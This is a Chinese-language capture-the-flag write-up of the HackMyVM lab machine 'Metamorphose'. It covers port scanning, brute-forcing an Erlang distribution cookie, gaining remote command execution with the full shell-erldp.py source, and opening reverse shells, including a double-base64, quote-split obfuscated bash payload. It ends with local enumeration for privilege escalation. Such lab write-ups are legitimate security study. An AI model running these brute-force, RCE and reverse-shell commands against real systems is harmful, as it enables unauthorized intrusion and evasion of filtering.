---
title: Metamorphose
author: hgbe02
date: 2024-08-06 01:00:00 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Metamorphose.html"
---

# Metamorphose

> 这个靶机很难，群里的师傅也搞了很长时间，可惜进展都不大，下载下来看一下哈！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058520.png" alt="image-20240803233432197" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058522.png" alt="image-20240804002813149" style="zoom: 50%;" />

> "Metamorphose" 是一个源自希腊语的英语词汇，意思是经历彻底的变化或转变，通常是从一种形态变为另一种形态。这个词常用来描述生物上的变化，比如昆虫从幼虫变成成虫的过程（例如毛毛虫变蝴蝶）。在更广泛的上下文中，它可以指任何事物的根本性改变，包括抽象概念或情况的变化。
>
> 例如：
>
> - 生物学中的变态发育过程。
> - 一个人或组织经历了重大转变后的结果。
> - 文学作品中人物形象的转变。

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ rustscan -a $IP -- -sCV                                                                             
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.20.10.3:22
Open 172.20.10.3:4369
Open 172.20.10.3:32837
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 12:29 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
Initiating Ping Scan at 12:29
Scanning 172.20.10.3 [2 ports]
Completed Ping Scan at 12:29, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:29
Completed Parallel DNS resolution of 1 host. at 12:29, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:29
Scanning 172.20.10.3 [3 ports]
Discovered open port 22/tcp on 172.20.10.3
Discovered open port 32837/tcp on 172.20.10.3
Discovered open port 4369/tcp on 172.20.10.3
Completed Connect Scan at 12:29, 0.00s elapsed (3 total ports)
Initiating Service scan at 12:29
Scanning 3 services on 172.20.10.3
Completed Service scan at 12:31, 126.23s elapsed (3 services on 1 host)
NSE: Script scanning 172.20.10.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 14.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 1.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
Nmap scan report for 172.20.10.3
Host is up, received conn-refused (0.0011s latency).
Scanned at 2024-08-03 12:29:34 EDT for 142s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a6:af:c3:72:91:52:e9:4d:e5:c7:7e:99:bd:15:97:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCBB+SGPU+Ekda80jLZ2gWo+zrdeZoEH0HtLz8vzI+iWYhXzWkEZlkemG4xonvYNV7ykMFbwXnNf+l0mBrttDxQ=
|   256 d8:77:85:74:f5:95:3d:0e:04:78:7d:f2:47:01:f9:98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHvrpQCogggApAEo48N0LAdvWpL4wgAgR/zqGJ8MA7YC
4369/tcp  open  epmd    syn-ack Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    network: 32837
32837/tcp open  unknown syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.35 seconds
```

## 漏洞发现

### 脚本利用（包含试错）

参考 https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ echo -n -e "\x00\x01\x6e" | nc -vn $IP 4369 
(UNKNOWN) [172.20.10.3] 4369 (epmd) open
name network at port 32837

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ nmap -sV -Pn -n -T4 -p 4369 --script epmd-info $IP 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 12:42 EDT
Nmap scan report for 172.20.10.3
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    network: 32837

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.21 seconds

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ nmap -sCV -p- $IP                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 12:44 EDT
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 12:45 (0:00:20 remaining)
Nmap scan report for 172.20.10.3
Host is up (0.0021s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a6:af:c3:72:91:52:e9:4d:e5:c7:7e:99:bd:15:97:fd (ECDSA)
|_  256 d8:77:85:74:f5:95:3d:0e:04:78:7d:f2:47:01:f9:98 (ED25519)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    network: 32837
32837/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

继续搜集信息：https://github.com/gteissier/erl-matter

发现这个cookie有迹可循的，尝试寻找现成的解决方案：https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/

```bash
┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ ls    
epmd_bf  erldp-info.nse  wget-log

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cd epmd_bf          

┌──(kali💀kali)-[~/temp/Metamorphose/epmd_bf]
└─$ ls
ebin  Emakefile  Makefile  priv  src

┌──(kali💀kali)-[~/temp/Metamorphose/epmd_bf]
└─$ cat src/epmd_bf.erl   
%  epmd_bf.erl
%  
%  Copyright 2017 Daniel Mende <mail@c0decafe.de>
%  
%  Redistribution and use in source and binary forms, with or without
%  modification, are permitted provided that the following conditions are
%  met:
%  
%  * Redistributions of source code must retain the above copyright
%    notice, this list of conditions and the following disclaimer.
%  * Redistributions in binary form must reproduce the above
%    copyright notice, this list of conditions and the following disclaimer
%    in the documentation and/or other materials provided with the
%    distribution.
%  * Neither the name of the  nor the names of its
%    contributors may be used to endorse or promote products derived from
%    this software without specific prior written permission.
%  
%  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
%  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
%  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
%  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
%  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
%  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
%  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
%  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
%  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
%  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
%  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

-module(epmd_bf).
-author('Daniel Mende <mail@c0decafe.de>').
-compile(export_all).

-include_lib("kernel/include/dist.hrl").

get_next(_, [_|[]]) ->
    stop;
get_next(Cur, [H|T]) ->
    if
        Cur == H ->
            lists:nth(1, T);
        true ->
            get_next(Cur, T)
    end.

next([], Alphabet) ->
    lists:nth(1, Alphabet);
next([H|T], Alphabet) ->
    case get_next(H, Alphabet) of
        stop ->
            [lists:nth(1, Alphabet) | next(T, Alphabet)];
        Next ->
            [Next | T]
    end.
    
gen_digest(Challenge, Cookie) when is_integer(Challenge), is_list(Cookie) ->
    erlang:md5([list_to_binary(Cookie)|integer_to_list(Challenge)]).

test_cookie({IP, Port}, Cookie) ->
    test_cookie({IP, Port}, Cookie, <<"epmd_bf@baldr.local">>).
test_cookie({IP, Port}, Cookie, NodeName) ->
    io:fwrite("Testing cookie ~s~n", [Cookie]),
    {ok, Socket} = gen_tcp:connect(IP, Port, [
            {packet, 2},
            {active, true},
            {nodelay, true},
            {reuseaddr, true},
            binary
        ]),
    Identification = <<
        "n",
        0,5,            % Version
        0,7,127,253,    % Flags
        NodeName/bytes  % NodeName
    >>,
    ok = gen_tcp:send(Socket, Identification),
    receive
        {tcp, _, <<"sok">>} -> 
            receive 
                {tcp, _, <<"n", _Version:16, _Flags:32, Challenge:32, Name/binary>>} -> 
                    %~ io:fwrite("Received Challenge ~p from ~s~n", [Challenge, Name]),
                    Digest = gen_digest(Challenge, Cookie),
                    ChallengeReply = <<
                        "r",
                        0,0,0,0,    % Challenge
                        Digest/bytes
                    >>,
                    ok = gen_tcp:send(Socket, ChallengeReply),
                    receive
                        {tcp_closed, _} ->
                            failed;
                        {tcp, _, <<"a", _/binary>>} ->
                            io:fwrite("Found cookie ~s for host ~s~n", [Cookie, Name]),
                            success;
                        Ret ->                            
                            io:fwrite("Received ~p~n", [Ret]),
                            error
                    end;
                Ret ->
                    io:fwrite("Received ~p~n", [Ret]),
                    error
                end;
        _ -> error
    end.

gen_first(N, Alphabet) ->
    gen_first(N, N, Alphabet).
gen_first(_, 0, _) ->
    [];
gen_first(N, C, Alphabet) ->
    [lists:nth(1, Alphabet) | gen_first(N, C-1, Alphabet)].

bf_cookie({IP, Port}, Alphabet, Cookie) ->
    case test_cookie({IP, Port}, Cookie) of
        success -> 
            stop;
        failed ->
            bf_cookie({IP, Port}, Alphabet, next(Cookie, Alphabet));
        _ ->
            stop
    end.

test() ->
    Alphabet = lists:seq($A,$Z),
    bf_cookie({{127,0,0,1}, 37453}, Alphabet, gen_first(20, Alphabet)).

┌──(kali💀kali)-[~/temp/Metamorphose/epmd_bf]
└─$ vim src/epmd_bf.erl

┌──(kali💀kali)-[~/temp/Metamorphose/epmd_bf]
└─$ tail src/epmd_bf.erl 
            stop;
        failed ->
            bf_cookie({IP, Port}, Alphabet, next(Cookie, Alphabet));
        _ ->
            stop
    end.

test() ->
    Alphabet = lists:seq($A,$Z),
    bf_cookie({{172.20.10.3}, 32837}, Alphabet, gen_first(20, Alphabet)).
```

尝试进行利用，但是不行，换一个试试：

```bash
time ./bruteforce-erldp --threads=16 --seed-start=381410768 --seed-end=386584488 --gap=1000 17 32837
```

不行，后来别的师傅出wp了，发现不是用的这个脚本，是对cookie进行了一个爆破。。。。。

```bash
┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ ls    
barrier.c           bruteforce-erldp.py   crack-hash    crack-prng.o           erldp.c         erldp.py           jsmn.h          __pycache__            shell-erldp.py
bin-seeds.py        complete-cookie       crack-hash.c  dictionary-erldp.py    erldp.h         erldp-warning.png  jsmn.o          README.md              sweep-default-cookie.py
bruteforce-erldp    complete-cookie.c     crack-hash.o  Docker-experiments.md  erldp-info.nse  example.dist       leaked-cookies  revert-prng.sage
bruteforce-erldp.c  complete-cookie.o     crack-prng    Dockerfile.erlang      erldp.o         Internet-scan.md   LICENSE         sample-cookies
bruteforce-erldp.o  complete-cookie.sage  crack-prng.c  erlang.py              erldp-proxy.py  jsmn.c             Makefile        seed-distribution.png

┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ head -n 20 leaked-cookies

111222333
123456
3ren
588a30cfed89e04a2f1f6f3a8d63f94e
ABCD
ABCEDEF
AFRTY12ESS3412735ASDF12378
C00KI3
C00KIE
COOKIE
ClueCon
CopSeesIt
DJQWUOCYZCIZNETCXWES
FOOBAR
JL0{%8cFLJ{IUr?QC{dOvS]yB%fqSUewy!FTu;_HAB0b`5r;o(KgP,5;y8QF2>ZT
NDZZKSSLLQEPDAGPLIGG
ODEzMTBlZjc5ZGY5NzQwYTM3ZDkwMzEx
OMNOMNOM
SFEWRG34AFDSGAFG35235

┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ cat shell-erldp.py    
#!/usr/bin/env python2

from struct import pack, unpack
from cStringIO import StringIO
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from binascii import hexlify, unhexlify
from random import choice
from string import ascii_uppercase
import sys
import argparse
import erlang as erl

def rand_id(n=6):
  return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

parser = argparse.ArgumentParser(description='Execute shell command through Erlang distribution protocol')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
parser.add_argument('--verbose', action='store_true', help='Output decode Erlang binary term format received')
parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value')
parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell')

args = parser.parse_args()

name = rand_id()

sock = socket(AF_INET, SOCK_STREAM, 0)
assert(sock)

sock.connect((args.target, args.port))

def send_name(name):
  FLAGS = (
    0x7499c +
    0x01000600 # HANDSHAKE_23|BIT_BINARIES|EXPORT_PTR_TAG
  )
  return pack('!HcQIH', 15 + len(name), 'N', FLAGS, 0xdeadbeef, len(name)) + name

sock.sendall(send_name(name))

data = sock.recv(5)
assert(data == '\x00\x03\x73\x6f\x6b')

data = sock.recv(4096)
(length, tag, flags, challenge, creation, nlen) = unpack('!HcQIIH', data[:21])
assert(tag == 'N')
assert(nlen + 19 == length)
challenge = '%u' % challenge

def send_challenge_reply(cookie, challenge):
  m = md5()
  m.update(cookie)
  m.update(challenge)
  response = m.digest()
  return pack('!HcI', len(response)+5, 'r', args.challenge) + response

sock.sendall(send_challenge_reply(args.cookie, challenge))


data = sock.recv(3)
if len(data) == 0:
  print('wrong cookie, auth unsuccessful')
  sys.exit(1)
else:
  assert(data == '\x00\x11\x61')
  digest = sock.recv(16)
  assert(len(digest) == 16)


print('[*] authenticated onto victim')



# Once connected, protocol between us and victim is described
# at http://erlang.org/doc/apps/erts/erl_dist_protocol.html#protocol-between-connected-nodes
# it is roughly a variant of erlang binary term format
# the format also depends on the version of ERTS post (incl.) or pre 5.7.2
# the format used here is based on pre 5.7.2, the old one

def erl_dist_recv(f):
  hdr = f.recv(4)
  if len(hdr) != 4: return
  (length,) = unpack('!I', hdr)
  data = f.recv(length)
  if len(data) != length: return

  # remove 0x70 from head of stream
  data = data[1:]

  while data:
    (parsed, term) = erl.binary_to_term(data)
    if parsed <= 0:
      print('failed to parse erlang term, may need to peek into it')
      break

    yield term

    data = data[parsed:]


def encode_string(name, type=0x64):
  return pack('!BH', type, len(name)) + name

def send_cmd_old(name, cmd):
  data = (unhexlify('70836804610667') + 
    encode_string(name) + 
    unhexlify('0000000300000000006400006400037265') +
    unhexlify('7883680267') + 
    encode_string(name) + 
    unhexlify('0000000300000000006805') +
    encode_string('call') +
    encode_string('os') +
    encode_string('cmd') +
    unhexlify('6c00000001') + 
    encode_string(cmd, 0x6b) + 
    unhexlify('6a') + 
    encode_string('user'))

  return pack('!I', len(data)) + data



def send_cmd(name, cmd):
  # REG_SEND control message
  ctrl_msg = (6,
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    erl.OtpErlangAtom(''),
    erl.OtpErlangAtom('rex'))
  msg = (
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    (
      erl.OtpErlangAtom('call'),
      erl.OtpErlangAtom('os'),
      erl.OtpErlangAtom('cmd'),
      [cmd],
      erl.OtpErlangAtom('user')
    ))

  new_data = '\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)

  return pack('!I', len(new_data)) + new_data

def recv_reply(f):
  terms = [t for t in erl_dist_recv(f)]
  if args.verbose:
    print('\nreceived %r' % (terms))

  assert(len(terms) == 2)
  answer = terms[1]
  assert(len(answer) == 2)
  return answer[1]


if not args.cmd:
  while True:
    try:
      cmd = raw_input('%s:%d $ ' % (args.target, args.port))
    except EOFError:
      print('')
      break

    sock.sendall(send_cmd(name, cmd))

    reply = recv_reply(sock)
    sys.stdout.write(reply)
else:
  sock.sendall(send_cmd(name, args.cmd))

  reply = recv_reply(sock)
  sys.stdout.write(reply)


print('[*] disconnecting from victim')
sock.close()

┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ python2 shell-erldp.py
usage: shell-erldp.py [-h] [--verbose] [--challenge CHALLENGE]
                      target port cookie [cmd]
shell-erldp.py: error: too few arguments

┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ echo -n -e "\x00\x01\x6e" | nc -vn $IP 4369
(UNKNOWN) [172.20.10.3] 4369 (epmd) open
name network at port 40121
```

尝试进行爆破，尝试了自带的弱密码但是不行，尝试一下rockyou的前一千个字典：

```bash
┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ head -n 1000 /usr/share/wordlists/rockyou.txt > rockyou_top1000.txt

┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ for i in $(cat ./rockyou_top1000.txt); do if ! python2 shell-erldp.py 172.20.10.3 40121 "$i" whoami 2>&1 | grep -q "wrong cookie, auth unsuccessful"; then echo "[+] cookie:$i"; break; fi; done
[+] cookie:batman
```

找到了cookie，尝试进行登录：

```bash
┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ python2 shell-erldp.py 172.20.10.3 40121 batman whoami 
[*] authenticated onto victim
Traceback (most recent call last):
  File "shell-erldp.py", line 172, in <module>
    reply = recv_reply(sock)
  File "shell-erldp.py", line 147, in recv_reply
    terms = [t for t in erl_dist_recv(f)]
  File "shell-erldp.py", line 94, in erl_dist_recv
    (parsed, term) = erl.binary_to_term(data)
  File "/home/kali/temp/Metamorphose/erl-matter/erlang.py", line 421, in binary_to_term
    i, term = _binary_to_term(1, data)
  File "/home/kali/temp/Metamorphose/erl-matter/erlang.py", line 505, in _binary_to_term
    i, tuple_value = _binary_to_term_sequence(i, length, data)
  File "/home/kali/temp/Metamorphose/erl-matter/erlang.py", line 630, in _binary_to_term_sequence
    i, element = _binary_to_term(i, data)
  File "/home/kali/temp/Metamorphose/erl-matter/erlang.py", line 625, in _binary_to_term
    raise ParseException('invalid tag')
erlang.ParseException: invalid tag
```

找chatgpt问了一下，发现：

> 根据提供的错误信息，这个异常是在尝试解析从一个Erlang分布协议 (Erlang Distribution Protocol, erldp) 接收到的数据时触发的。错误 `erlang.ParseException: invalid tag` 表明在解析过程中遇到了无法识别的数据标签。
>
> 这里有几个可能的原因和解决方法：
>
> 1. **数据格式问题**:
>    - 确保发送方发送的是有效的 Erlang 项（例如元组、列表、原子等）并且这些项正确地被编码为二进制格式。
>    - 检查发送方是否使用了正确的 Erlang 分布协议版本，并且接收端能够理解该版本。
> 2. **网络传输问题**:
>    - 数据在网络传输过程中可能被损坏或截断。确保网络连接稳定可靠。
>    - 如果使用的是 UDP 或其他不可靠的协议，确保所有数据包都已完整接收。
> 3. **代码实现问题**:
>    - 在 `erl-matter/erlang.py` 中的 `_binary_to_term` 函数中，如果遇到未知或不支持的数据类型，则会抛出 `ParseException`。检查该函数以了解哪些标签是被支持的，以及哪些标签会导致此异常。
>    - 确认 `_binary_to_term` 和 `_binary_to_term_sequence` 函数是否能正确处理所有可能的数据结构和标签。
> 4. **调试建议**:
>    - 在 `recv_reply` 和 `erl_dist_recv` 函数中添加调试输出，打印接收到的原始数据，以便检查数据是否符合预期。
>    - 检查发送方的代码逻辑，确保它按照 Erlang 的二进制术语格式正确地构造了数据。
>    - 如果可能的话，使用 Erlang 的内置工具进行测试，比如 `net_adm:ping/1`，以确认接收端可以正确地与 Erlang 节点通信。
> 5. **版本兼容性问题**:
>    - 如果你的代码依赖于特定版本的 Erlang，确保客户端和服务端使用的 Erlang 版本兼容。****

尝试抓包看一下：

> -vvv：产生比-vv更详细的输出。 
>
> -XX：输出包的头部数据，会以16进制和ASCII两种方式同时输出。
>
> -nn ：直接以IP以及PORT number显示，而非主机名与服务名称

```bash
┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ sudo tcpdump -i eth1 host 172.20.10.3 -vvv -XX -nn     
tcpdump: listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
.........
11:21:13.819722 IP (tos 0x0, ttl 64, id 32961, offset 0, flags [DF], proto TCP (6), length 93)
    172.20.10.3.40121 > 172.20.10.8.44550: Flags [P.], cksum 0xd59c (correct), seq 6:47, ack 32, win 509, options [nop,nop,TS val 3619497937 ecr 1177140916], length 41
        0x0000:  0800 27fb 51ff 0800 27df cd6e 0800 4500  ..'.Q...'..n..E.
        0x0010:  005d 80c1 4000 4006 4da6 ac14 0a03 ac14  .]..@.@.M.......
        0x0020:  0a08 9cb9 ae06 31a1 1561 ceb8 3709 8018  ......1..a..7...
        0x0030:  01fd d59c 0000 0101 080a d7bd 27d1 4629  ............'.F)
        0x0040:  beb4 0027 4e00 0000 0d07 df7f bd9d f8eb  ...'N...........
        0x0050:  b666 b0d3 1f00 146e 6574 776f 726b 406d  .f.....network@m
        0x0060:  6574 616d 6f72 7068 6f73 65              etamorphose
...............
11:21:13.832587 IP (tos 0x0, ttl 64, id 32963, offset 0, flags [DF], proto TCP (6), length 178)
    172.20.10.3.40121 > 172.20.10.8.44550: Flags [P.], cksum 0xf79a (correct), seq 66:192, ack 161, win 509, options [nop,nop,TS val 3619497950 ecr 1177140919], length 126
        0x0000:  0800 27fb 51ff 0800 27df cd6e 0800 4500  ..'.Q...'..n..E.
        0x0010:  00b2 80c3 4000 4006 4d4f ac14 0a03 ac14  ....@.@.MO......
        0x0020:  0a08 9cb9 ae06 31a1 159d ceb8 378a 8018  ......1.....7...
        0x0030:  01fd f79a 0000 0101 080a d7bd 27de 4629  ............'.F)
        0x0040:  beb7 0000 007a 7083 6803 6102 7700 5877  .....zp.h.a.w.Xw
        0x0050:  0e56 5155 4654 4a40 6e6f 7768 6572 6500  .VQUFTJ@nowhere.
        0x0060:  0000 0300 0000 0000 0000 0083 6802 7703  ............h.w.
        0x0070:  7265 786b 004a 7569 643d 3130 3030 286d  rexk.Juid=1000(m
        0x0080:  656c 626f 7572 6e65 2920 6769 643d 3130  elbourne).gid=10
        0x0090:  3030 286d 656c 626f 7572 6e65 2920 6772  00(melbourne).gr
        0x00a0:  6f75 7073 3d31 3030 3028 6d65 6c62 6f75  oups=1000(melbou
        0x00b0:  726e 6529 2c31 3030 2875 7365 7273 290a  rne),100(users).
```

发现是有包的，且可以返回的，尝试进行反弹shell。

```bash
┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ python2 shell-erldp.py 172.20.10.3 40121 batman 'nc -e /bin/bash 172.20.10.8 1234'
[*] authenticated onto victim
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058523.png" alt="image-20240805232810783" style="zoom:50%;" />

这个地方[PL4GU3](https://www.youtube.com/@thePL4GU3)大佬为了省事直接双重`base64`加密，是个很值得学习的思路，尝试一下：

```bash
# bash -i &>/dev/tcp/172.20.10.8/1234 <&1
# YmFzaCAtaSAmPi9kZXYvdGNwLzE3Mi4yMC4xMC44LzEyMzQgPCYx
# WW1GemFDQXRhU0FtUGk5a1pYWXZkR053THpFM01pNHlNQzR4TUM0NEx6RXlNelFnUENZeA==
# echo${IFS}WW1GemFDQXRhU0FtUGk5a1pYWXZkR053THpFM01pNHlNQzR4TUM0NEx6RXlNelFnUENZeA==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h

┌──(kali💀kali)-[~/temp/Metamorphose/erl-matter]
└─$ python2 shell-erldp.py 172.20.10.3 40121 batman                                   
[*] authenticated onto victim
172.20.10.3:40121 $ echo${IFS}WW1GemFDQXRhU0FtUGk5a1pYWXZkR053THpFM01pNHlNQzR4TUM0NEx6RXlNelFnUENZeA==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058524.png" alt="image-20240805233704132" style="zoom: 50%;" />

## 提权

### 信息搜集

```bash
(remote) melbourne@metamorphose.hmv:/$ whoami;id
melbourne
uid=1000(melbourne) gid=1000(melbourne) groups=1000(melbourne),100(users)
(remote) melbourne@metamorphose.hmv:/$ cd ~
(remote) melbourne@metamorphose.hmv:/home/melbourne$ ls -la
total 28
drwx------ 3 melbourne melbourne 4096 Feb 26 17:32 .
drwxr-xr-x 4 root      root      4096 Feb 26 17:14 ..
lrwxrwxrwx 1 root      root         9 Feb 26 17:32 .bash_history -> /dev/null
-rw-r--r-- 1 melbourne melbourne  220 Feb 26 17:14 .bash_logout
-rw-r--r-- 1 melbourne melbourne 3526 Feb 26 17:14 .bashrc
-rw------- 1 melbourne melbourne    7 Feb 26 17:15 .erlang.cookie
drwxr-xr-x 3 melbourne melbourne 4096 Mar  2 18:23 .local
-rw-r--r-- 1 melbourne melbourne  807 Feb 26 17:14 .profile
(remote) melbourne@metamorphose.hmv:/home/melbourne$ cd .local/
(remote) melbourne@metamorphose.hmv:/home/melbourne/.local$ ls -la
total 16
drwxr-xr-x 3 melbourne melbourne 4096 Mar  2 18:23 .
drwx------ 3 melbourne melbourne 4096 Feb 26 17:32 ..
-rwxr-xr-x 1 melbourne melbourne  102 Feb 26 17:15 erlang
drwx------ 3 melbourne melbourne 4096 Feb 26 17:15 share
(remote) melbourne@metamorphose.hmv:/home/melbourne/.local$ cat erlang 
#!/bin/bash

sleep 4

/usr/bin/erl -sname network@metamorphose -noinput -eval "timer:sleep(infinity)"
(remote) melbourne@metamorphose.hmv:/home/melbourne/.local$ cd ..
(remote) melbourne@metamorphose.hmv:/home/melbourne$ cat .erlang.cookie 
batman
(remote) melbourne@metamorphose.hmv:/home/melbourne$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
(remote) melbourne@metamorphose.hmv:/home/melbourne$ /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
(remote) melbourne@metamorphose.hmv:/home/melbourne$ sudo -l
bash: sudo: command not found
(remote) melbourne@metamorphose.hmv:/home/melbourne$ cd /
(remote) melbourne@metamorphose.hmv:/$ ls -la
total 8488
drwxr-xr-x  18 root root  266240 May 28 11:22 .
drwxr-xr-x  18 root root  266240 May 28 11:22 ..
lrwxrwxrwx   1 root root       7 Feb 26 09:57 bin -> usr/bin
drwxr-xr-x   3 root root    4096 May 28 11:23 boot
drwxr-xr-x  17 root root    3320 Aug  5 15:26 dev
drwxr-xr-x  95 root root    4096 Aug  5 15:26 etc
drwxr-xr-x   4 root root    4096 Feb 26 17:14 home
lrwxrwxrwx   1 root root      30 May 28 11:22 initrd.img -> boot/initrd.img-6.1.0-21-amd64
lrwxrwxrwx   1 root root      30 Feb 26 09:58 initrd.img.old -> boot/initrd.img-6.1.0-18-amd64
